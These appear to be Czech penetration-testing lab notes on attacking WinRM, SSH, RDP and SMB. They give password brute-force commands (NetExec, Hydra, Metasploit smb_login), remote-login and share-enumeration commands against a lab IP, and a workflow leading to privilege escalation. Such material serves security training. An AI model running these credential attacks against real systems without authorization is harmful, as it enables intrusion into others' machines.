# 🌐 Network Services

---

# 🖥️ Windows Remote Management (WinRM)

## Přehled

WinRM je moderní Microsoft protokol pro vzdálenou správu Windows systémů.

Používá:

|Protokol|Port|
|---|---|
|HTTP|5985|
|HTTPS|5986|

Po získání platných přihlašovacích údajů může poskytnout přímý PowerShell přístup.

---

# 🛠️ NetExec (CrackMapExec nástupce)

NetExec je nástroj pro práci s Windows protokoly.

Umí:

- autentizaci
    
- enumeraci
    
- kontrolu oprávnění
    
- práci s Active Directory
    

---

## Brute-force WinRM

```bash
netexec winrm 10.129.42.197 \
-u user.list \
-p password.list
```

---

## Úspěšná autentizace

Výstup:

```text
(Pwn3d!)
```

znamená, že účet má možnost spouštět příkazy přes WinRM.

---

# ⚡ Evil-WinRM

Jeden z nejpoužívanějších nástrojů pro interaktivní PowerShell session.

---

## Přihlášení

```bash
evil-winrm \
-i 10.129.42.197 \
-u user \
-p password
```

---

Po úspěchu získáš:

```powershell
PS C:\Users\user>
```

---

# 🔑 Secure Shell (SSH)

## Přehled

SSH je standardní protokol pro vzdálenou správu Linux systémů.

Port:

```text
22/TCP
```

Používá:

- symetrické šifrování
    
- asymetrické klíče
    
- autentizaci heslem nebo klíčem
    

---

# Hydra - SSH Password Testing

```bash
hydra \
-L user.list \
-P password.list \
ssh://10.129.42.197 \
-t 4
```

---

## Proč použít `-t 4`

SSH servery často:

- omezují počet spojení
    
- blokují příliš rychlé pokusy
    

Nižší počet vláken je stabilnější.

---

# SSH Přihlášení

```bash
ssh user@10.129.42.197
```

---

# 🖥️ Remote Desktop Protocol (RDP)

## Přehled

RDP umožňuje grafické vzdálené ovládání Windows.

Port:

```text
3389/TCP
```

---

# Hydra - RDP Testing

```bash
hydra \
-L user.list \
-P password.list \
rdp://10.129.42.197
```

---

# xfreerdp

Linuxový klient pro RDP.

---

## Připojení

```bash
xfreerdp3 \
/v:10.129.42.197 \
/u:user \
/p:password \
/dynamic-resolution
```

---

Výsledek:

```text
Windows Desktop Session
```

---

# 📁 Server Message Block (SMB)

## Přehled

SMB je protokol pro:

- sdílení souborů
    
- tiskárny
    
- síťové prostředky
    

Port:

```text
445/TCP
```

Starší verze:

```text
139/TCP
```

---

Použití:

- Windows File Sharing
    
- Active Directory prostředí
    
- laterální pohyb
    

---

# 🔐 SMB Login Testing

## Metasploit

Pokud běžné nástroje nefungují:

```bash
msfconsole
```

---

Modul:

```text
use auxiliary/scanner/smb/smb_login
```

Nastavení:

```bash
set RHOSTS 10.129.42.197
set USER_FILE user.list
set PASS_FILE password.list
run
```

---

# 🔎 SMB Enumerace Share

## NetExec

Zjistí dostupné sdílené složky:

```bash
netexec smb 10.129.42.197 \
-u user \
-p password \
--shares
```

---

Příklad výsledku:

```text
ADMIN$
C$
Public
Documents
```

---

# 📂 smbclient

Interaktivní práce se sdílenou složkou.

---

## Připojení

```bash
smbclient \
-U user \
\\\\10.129.42.197\\SHARENAME
```

---

Užitečné příkazy:

```text
ls
get file.txt
put file.txt
cd folder
```

---

# 📊 Přehled Network Services

|Služba|Port|Nástroje|Typický přístup|
|---|---|---|---|
|WinRM|5985 / 5986|NetExec, Evil-WinRM|PowerShell|
|SSH|22|Hydra, ssh|Bash Shell|
|RDP|3389|Hydra, xfreerdp|GUI Desktop|
|SMB|445|smbclient, NetExec, Metasploit|Sdílení souborů|

---

# 🧭 Doporučený Workflow

```text
Nmap Scan
     |
     ▼
Identifikace služby
     |
     ▼
Test autentizace
     |
     ▼
Validní účet?
     |
     ▼
Interaktivní přístup
     |
     ▼
Enumerace práv
     |
     ▼
Privilege Escalation
```

---

# 🧰 Nejčastější Nástroje

|Nástroj|Použití|
|---|---|
|Nmap|Discovery služeb|
|NetExec|Windows protokoly|
|Evil-WinRM|WinRM shell|
|Hydra|Password testing|
|xfreerdp|RDP klient|
|smbclient|SMB práce|
|Metasploit|Moduly a exploity|
